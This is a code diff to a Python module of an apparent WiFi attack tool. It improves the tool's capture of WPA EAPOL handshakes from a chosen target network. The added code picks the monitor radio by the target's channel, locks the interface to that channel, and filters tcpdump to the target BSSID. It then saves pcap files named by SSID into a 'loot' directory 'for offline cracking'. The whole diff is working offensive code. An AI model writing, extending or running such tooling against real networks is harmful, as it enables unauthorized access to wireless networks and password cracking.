@@ -83,13 +83,39 @@ def _eapol_loop():
         pass
 
 
+def _pick_iface(target):
+    """Select the monitor interface whose band matches the target's
+    channel. phy0 (wlan0mon) is 2.4GHz-only, phy1 (wlan1mon) handles
+    5GHz. If we don't know the target's channel, default to
+    wlan0mon since the vast majority of consumer APs run 2.4GHz."""
+    ch = None
+    if isinstance(target, dict):
+        try:
+            ch = int(target.get('channel'))
+        except (TypeError, ValueError):
+            ch = None
+    if ch is None:
+        return 'wlan0mon'
+    if 1 <= ch <= 14:
+        return 'wlan0mon'
+    return 'wlan1mon'
+
+
 def start(config):
     global _stop_event, _pcap_proc, _eapol_proc, _eapol_thread
 
     if _state['running']:
         return True
 
-    iface = config.get('wifi_attack_iface', 'wlan1mon')
+    target = config.get('wifi_attack_target')
+    # Auto-pick the monitor interface for the target's band so
+    # we don't miss the handshake because the sniff was on the
+    # wrong radio.
+    iface = _pick_iface(target)
+    if not _iface_exists(iface):
+        # Fall back to the user's explicit iface setting if auto
+        # pick isn't available (e.g. USB dongle removed).
+        iface = config.get('wifi_attack_iface', 'wlan1mon')
     if not _iface_exists(iface):
         _state['errors'] += 1
         _state['error_msg'] = f'{iface} not up'
@@ -102,8 +128,34 @@ def start(config):
         _state['error_msg'] = f'loot dir: {e}'[:120]
         return False
 
+    target = config.get('wifi_attack_target')
+    target_bssid = None
+    target_ch = None
+    if isinstance(target, dict):
+        target_bssid = (target.get('bssid') or '').lower() or None
+        try:
+            target_ch = int(target.get('channel')) if target.get('channel') else None
+        except (TypeError, ValueError):
+            target_ch = None
+
+    # Lock monitor iface to the target's channel if we have one. Without
+    # a lock, the driver may hop and miss the handshake when it happens.
+    if target_ch:
+        try:
+            subprocess.run(['iw', 'dev', iface, 'set', 'channel',
+                             str(target_ch)], capture_output=True,
+                             timeout=3)
+        except Exception:
+            pass
+
     ts = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
-    pcap_path = os.path.join(LOOT_DIR, f'capture_{ts}.pcap')
+    ssid_tag = ''
+    if isinstance(target, dict) and target.get('ssid'):
+        # Sanitize ssid for filename
+        safe = re.sub(r'[^A-Za-z0-9_-]+', '_', target.get('ssid', ''))[:24]
+        if safe:
+            ssid_tag = '_' + safe
+    pcap_path = os.path.join(LOOT_DIR, f'capture{ssid_tag}_{ts}.pcap')
 
     _state['errors'] = 0
     _state['error_msg'] = None
@@ -112,14 +164,25 @@ def start(config):
     _state['pcap_path'] = pcap_path
     _seen_pairs.clear()
 
+    # BPF filter: EAPOL only (and optionally limit to target BSSID so
+    # the pcap isn't bloated with unrelated beacons/data frames).
+    eapol_filter = 'ether proto 0x888e'
+    pcap_filter = None
+    if target_bssid:
+        pcap_filter = f'ether host {target_bssid}'
+        eapol_filter = f'{eapol_filter} and ether host {target_bssid}'
+
     # Full pcap stream for offline cracking
-    _pcap_proc = _run_bg(['tcpdump', '-i', iface, '-w', pcap_path, '-U'])
+    pcap_cmd = ['tcpdump', '-i', iface, '-w', pcap_path, '-U']
+    if pcap_filter:
+        pcap_cmd.append(pcap_filter)
+    _pcap_proc = _run_bg(pcap_cmd)
     if _pcap_proc is None:
         return False
 
     # Live EAPOL watcher for the counter
     _eapol_proc = _run_bg(
-        ['tcpdump', '-i', iface, '-e', '-l', 'ether proto 0x888e'])
+        ['tcpdump', '-i', iface, '-e', '-l', eapol_filter])
     if _eapol_proc is None:
         # keep pcap going even if eapol watcher failed
         pass
